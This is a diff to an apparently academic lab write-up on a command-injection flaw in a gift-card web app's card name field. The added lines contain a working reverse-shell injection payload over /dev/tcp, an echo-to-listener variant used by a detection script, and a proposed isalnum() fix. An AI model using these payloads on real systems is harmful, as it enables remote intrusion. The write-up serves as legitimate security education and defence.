@@ -205,7 +205,22 @@ on the useCard.html site we see there is an alterante field for naming your card
 
 We succeed in injecting a command.
 
-As a proof of concept exploit we use our malicious giftcard file and run the following command in the card name field ```; bash -c "bash -c " echo -n pwned > /dev/tcp/0.0.0.0/8888 0<&1 2>&1" ;```
-This works becuase -c will execute any command in between the quotes. The command in quotes is based on Lab1  to invoke a reverse shell except this time we are seding an echo to our listener. 
+As a proof of concept exploit we use our malicious giftcard file and run the following command in the card name field ```;bash -c "/bin/bash -i > /dev/tcp/10.0.2.15/9090 0<&1 2>&1" ;```
+This works becuase -c will execute any command in between the quotes. The command in quotes is based on Lab1  to invoke a reverse shell. 
 
 <img width="1140" alt="Screen Shot 2022-03-22 at 1 53 21 AM" src="https://user-images.githubusercontent.com/72175659/159598757-92d16922-8f54-4a11-b33b-f35ede9d772a.png">
+
+For our python script that detects the vulnerability we need to send an echo instead of a shell so we can use the command ```; bash -c "bash -c " echo -n pwned > /dev/tcp/0.0.0.0/8888 0<&1 2>&1" ;```. This sends "pwned" to our listener which then detects the vulnerability through an if statement. 
+
+<img width="996" alt="Screen Shot 2022-03-24 at 1 12 38 AM" src="https://user-images.githubusercontent.com/72175659/159846843-b7b8cdff-b747-41b1-896e-962cb6a63bbc.png">
+
+We build on earlier attacks and use the socket method provided in the labs to achieve detection.
+
+<img width="988" alt="Screen Shot 2022-03-24 at 1 15 35 AM" src="https://user-images.githubusercontent.com/72175659/159847118-2943a8b6-a710-4963-ad61-a822df67a34c.png">
+
+line 189 in views.py can be blamed for the vulnerability as it only validates empty input as faulty but fails to mitigate against malicious user input. We can not trust the user to control the kind of parsing done with card_fname as it is sometimes parsed along with system commands. An easy fix is to check the input to see if its alphanumeric with isalnum(). Since a name should only be alphanumeric and not contain malicious characters. 
+
+
+
+
+
